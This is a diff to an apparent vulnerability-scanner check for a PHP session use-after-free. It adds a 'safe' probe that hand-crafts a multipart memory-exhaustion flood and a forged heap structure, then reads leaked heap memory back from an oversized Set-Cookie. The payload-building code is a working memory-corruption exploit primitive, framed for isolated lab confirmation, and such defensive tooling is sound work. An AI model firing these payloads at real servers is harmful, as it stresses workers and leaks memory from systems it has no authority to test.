@@ -2,9 +2,12 @@ from __future__ import annotations
 
 import re
 import socket
+import struct
+import urllib.parse
 from typing import Any
 
 from ...core.categories import VulnerabilityType
+from ...core.http import HttpSession
 from ...core.models import Confidence, Finding, Status
 from ...core.transcript import attach_transcript, make_entry
 from .php_2026_memory import classify_version as _classify_version
@@ -16,7 +19,7 @@ NAME = "PHP request shutdown residual-state use-after-free"
 RULE = "PHP 8.2 before 8.2.35, 8.3 before 8.3.36, 8.4 before 8.4.27, and 8.5 before 8.5.12; legacy branches require package verification"
 TYPE = VulnerabilityType.MEMORY_CORRUPTION
 HAS_EXPLOIT = True
-EXPLOIT_MODES = ["aggressive"]
+EXPLOIT_MODES = ["safe", "aggressive"]
 
 # Flood geometry from the research unit: 995 ~3 KB fields (~3 MB) plus a NUL
 # PHPSESSID field, an upload-progress field and a small file part. With the
@@ -130,6 +133,230 @@ def _build_minimal() -> bytes:
 
 def _build_get(path: str = "/sess.php") -> bytes:
     return f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n".encode()
+
+
+SAFE_BOUNDARY = b"S" * 17
+SAFE_FLOOD_FIELDS = 1001
+SAFE_FLOOD_BIG = 12 * 1024 * 1024
+
+
+def _safe_flood_body() -> bytes:
+    """Build the exact research A shape: 1001 dummy fields, NUL PHPSESSID,
+    upload-progress marker, file part FIRST, then the 12 MB field.
+
+    Part order matters: the heap must OOM while parsing the big field with
+    the file part already registered. urllib's multipart builder always
+    emits fields before files, so the body is hand-rolled here.
+    """
+    parts = b""
+    for i in range(SAFE_FLOOD_FIELDS):
+        parts += (
+            b"--" + SAFE_BOUNDARY + b"\r\n"
+            + b'Content-Disposition: form-data; name="p%04d"\r\n\r\nx\r\n' % i
+        )
+    parts += (
+        b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n\x00\r\n'
+        + b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
+        + b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
+        + b"Content-Type: application/octet-stream\r\n\r\n" + b"A" * 64 + b"\r\n"
+        + b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="big"\r\n\r\n' + b"B" * SAFE_FLOOD_BIG + b"\r\n"
+        + b"--" + SAFE_BOUNDARY + b"--\r\n"
+    )
+    return parts
+
+
+def _safe_consume_body() -> bytes:
+    """Build the research B shape: PHPSESSID + progress + 841x48B fields + a
+    79-byte forge whose +0x10 quadword reads 0x1000 and +0x18 byte is 'L'.
+
+    On affected builds the pre-RINIT cleanup reuses the dangling session id
+    and the forge makes the reclaimed id a 4096-byte string, which comes back
+    as a >1000-byte Set-Cookie. Fixed builds emit a fresh 32-byte id.
+    """
+    parts = (
+        b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\nattacksessionid0001\r\n'
+        + b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
+    )
+    for i in range(841):
+        value = (f"v{i:04d}" + "x" * 43)[:48]
+        parts += (
+            b"--" + SAFE_BOUNDARY + b"\r\n"
+            + f'Content-Disposition: form-data; name="{1000 + i}"\r\n\r\n{value}\r\n'.encode()
+        )
+    forge = bytearray(b"A" * 79)
+    struct.pack_into("<Q", forge, 0x10, 0x1000)
+    forge[0x18] = ord("L")
+    parts += (
+        b"--" + SAFE_BOUNDARY + b"\r\n"
+        + b'Content-Disposition: form-data; name="1999"\r\n\r\n' + bytes(forge) + b"\r\n"
+        + b"--" + SAFE_BOUNDARY + b"--\r\n"
+    )
+    return parts
+
+
+def _set_cookie_len(response: dict[str, Any]) -> int:
+    headers = response.get("headers_multi") or response.get("headers") or {}
+    for value in headers.get("set-cookie", headers.get("Set-Cookie", [])):
+        match = re.match(r"PHPSESSID=([^;]*)", value)
+        if match:
+            return len(urllib.parse.unquote(match.group(1)))
+    return 0
+
+
+def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
+    """Fire the stale-PSID unit (A flood, then the reclaiming B) and read B's cookie.
+
+    Read-only: no worker dies, no code executes, nothing is uploaded. A
+    >1000-byte Set-Cookie is the leaked 4096-byte reclaimed id (affected);
+    a 32-byte cookie is a fresh id (fixed). Needs the cli-server style lab
+    (single process); the Set-Cookie stays under 64 KB so the standard
+    HTTP client parses it.
+    """
+    from urllib.parse import urlsplit
+
+    parsed = urlsplit(target_url)
+    if parsed.scheme == "https":
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status=Status.NOT_CONFIRMED,
+            confidence=Confidence.LOW,
+            component="PHP runtime",
+            affected_rule=RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=False,
+            detail="The cli-server leak probe needs plain HTTP; TLS was requested.",
+            action="Point the probe at the loopback cli-server lab over HTTP.",
+            vulnerability_type=TYPE,
+        )
+    base = f"http://{parsed.hostname or '127.0.0.1'}:{parsed.port or 80}"
+    sess = HttpSession(base, timeout=timeout, proxy=proxy)
+
+    baseline = sess.get("/index.php", timeout=timeout)
+    if baseline.get("status") != 200 or "OK" not in str(baseline.get("body", "")):
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status=Status.NOT_CONFIRMED,
+            confidence=Confidence.MEDIUM,
+            component="PHP runtime",
+            affected_rule=RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=False,
+            detail=(
+                "The lab baseline endpoint /index.php did not answer HTTP 200. "
+                "The leak differential needs the cli-server lab app; no payload was sent."
+            ),
+            action="Serve the labs/cve-2026-109619-cli app and retry in an isolated lab.",
+            vulnerability_type=TYPE,
+        )
+
+    flood = sess.post(
+        "/index.php",
+        data=_safe_flood_body(),
+        # Connection: close is load-bearing: on a reused keep-alive
+        # connection the lifecycle differs and the stale state is not
+        # consumed. The research harness uses one connection per request.
+        headers={
+            "Content-Type": f"multipart/form-data; boundary={SAFE_BOUNDARY.decode()}",
+            "Connection": "close",
+        },
+        timeout=max(timeout, 120),
+    )
+    followup = sess.post(
+        "/index.php",
+        data=_safe_consume_body(),
+        headers={
+            "Content-Type": f"multipart/form-data; boundary={SAFE_BOUNDARY.decode()}",
+            "Connection": "close",
+        },
+        timeout=max(timeout, 60),
+    )
+    cookie_len = _set_cookie_len(followup)
+    body = str(followup.get("body", ""))
+    stale_warning = "4096 characters" in body
+    evidence = attach_transcript(
+        {
+            "flood_status": flood.get("status"),
+            "followup_status": followup.get("status"),
+            "cookie_len": cookie_len,
+            "stale_warning": stale_warning,
+            "probe": "stale-psid-unit",
+        },
+        sess,
+    )
+    if cookie_len > 1000:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status=Status.VULNERABLE,
+            confidence=Confidence.CONFIRMED,
+            component="PHP runtime",
+            affected_rule=RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            proof_url=f"{base}/index.php",
+            detail=(
+                f"The follow-up request returned a {cookie_len}-byte Set-Cookie: the reclaimed "
+                "4096-byte session id leaked heap memory. Fixed builds answer the same shape "
+                "with a fresh 32-byte id. This confirms CVE-2026-109619 without executing anything."
+            ),
+            action=(
+                "Upgrade PHP to the fixed branch release (8.2.35/8.3.36/8.4.27/8.5.12). "
+                "For EOL branches, verify the vendor package changelog or binary backport. "
+                "Remove lab session files (docker exec <web> rm -f /tmp/sess_*)."
+            ),
+            evidence=evidence,
+            vulnerability_type=TYPE,
+        )
+    if stale_warning:
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status=Status.VULNERABLE,
+            confidence=Confidence.HIGH,
+            component="PHP runtime",
+            affected_rule=RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            proof_url=f"{base}/index.php",
+            detail=(
+                "The follow-up request consumed a stale 4096-char session id (startup warning) "
+                "but emitted no cookie: the send_cookie gate held. This still demonstrates "
+                "residual-state reuse without executing anything."
+            ),
+            action=(
+                "Upgrade PHP to the fixed branch release. "
+                "Remove lab session files (docker exec <web> rm -f /tmp/sess_*)."
+            ),
+            evidence=evidence,
+            vulnerability_type=TYPE,
+        )
+    return Finding(
+        cve=CVE_ID,
+        name=NAME,
+        status=Status.NOT_CONFIRMED,
+        confidence=Confidence.MEDIUM,
+        component="PHP runtime",
+        affected_rule=RULE,
+        exploit_available=HAS_EXPLOIT,
+        exploit_ran=True,
+        detail=(
+            f"The follow-up request answered HTTP {followup.get('status')} with a {cookie_len}-byte "
+            "cookie. That is the fixed-build behavior on the cli-server lab (php -S). Note: "
+            "mod_php answers the same shape with a fresh cookie even when affected, so a "
+            "NOT_CONFIRMED here only clears the cli-server SAPI — use aggressive mode for mod_php."
+        ),
+        action="No action required if the runtime is at or beyond the branch-specific fixed release.",
+        evidence=evidence,
+        vulnerability_type=TYPE,
+    )
 
 
 def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
@@ -281,13 +508,13 @@ def check(
     passive.exploit_available = HAS_EXPLOIT
     if not run_exploit_check:
         return passive
-    if exploit_mode != "aggressive":
-        passive.detail += " This CVE needs the lab-only OOM-gate differential (aggressive: one worker is stressed)."
-        return passive
     if passive.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
-        passive.detail += " Aggressive proof skipped because the PHP version was not potentially affected."
+        passive.detail += " Exploit proof skipped because the PHP version was not potentially affected."
         return passive
-    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
+    if exploit_mode == "aggressive":
+        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
+    else:
+        result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
     result.component_version = passive.component_version
     return result
 
